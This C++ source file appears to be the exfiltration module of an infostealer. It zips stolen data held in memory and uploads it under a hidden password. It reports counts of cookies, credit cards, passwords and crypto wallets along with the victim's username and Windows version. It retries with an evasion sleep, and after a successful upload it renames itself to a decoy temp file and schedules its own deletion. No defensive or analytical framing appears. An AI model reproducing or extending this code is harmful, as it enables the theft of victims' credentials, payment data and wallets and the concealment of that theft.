#include <exfiltration_utils/log_collection.hpp>
#include <exfiltration_utils/mem_store.hpp>
#include <exfiltration_utils/zip.hpp>
#include <net_utils/simple_net.hpp>
#include <browser_utils/stats_struct.hpp>
#include <safety_utils/evasion.hpp>
#include <sysinfo.hpp>
#include <debug_utils/log.hpp>
#include <crypto_utils/skCrypter.hpp>
#include <windows.h>

namespace exfiltration_utils {

void exfiltrate_logs(const std::string& api_key, const std::string& ip, const std::string& country) {
    auto zip_data = zip_utils::zip_to_buf(mem_store::files());

    std::string name             = features::get_username();
    std::string cookies          = std::to_string(features::stats.cookie_count);
    std::string creditcards      = std::to_string(features::stats.card_count);
    std::string passwords        = std::to_string(features::stats.password_count);
    std::string cryptocurrencies = std::to_string(features::stats.wallet_count);
    std::string windows_version  = simple_net::to_string(features::get_version());
    std::string zip_pass         = std::string(skCrypt(ZIP_PASS_STR));

    bool ok = false;
    for (int attempt = 1; attempt <= 3 && !ok; attempt++) {
        if (attempt > 1) evasion::obfuscated_sleep(2000 * attempt);
        ok = simple_net::upload_logs(
            zip_data, api_key,
            name, ip, country,
            cookies, creditcards, passwords, cryptocurrencies,
            windows_version, zip_pass);
        DBG_LOG(ok ? "upload ok" : "upload retry");
    }

    DBG_LOG(ok ? "exfil success" : "exfil failed");

    if (ok) self_delete();
    mem_store::clear();
}

void self_delete() {
    wchar_t path[MAX_PATH]{};
    GetModuleFileNameW(nullptr, path, MAX_PATH);

    //rename to .dat so the original filename disappears immediately
    wchar_t tmp[MAX_PATH]{};
    GetTempPathW(MAX_PATH, tmp);
    wcscat_s(tmp, skCrypt(L"upd_cache.dat"));
    MoveFileExW(path, tmp, MOVEFILE_REPLACE_EXISTING);

    //schedule the renamed file for deletion.
    MoveFileExW(tmp, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
}

}
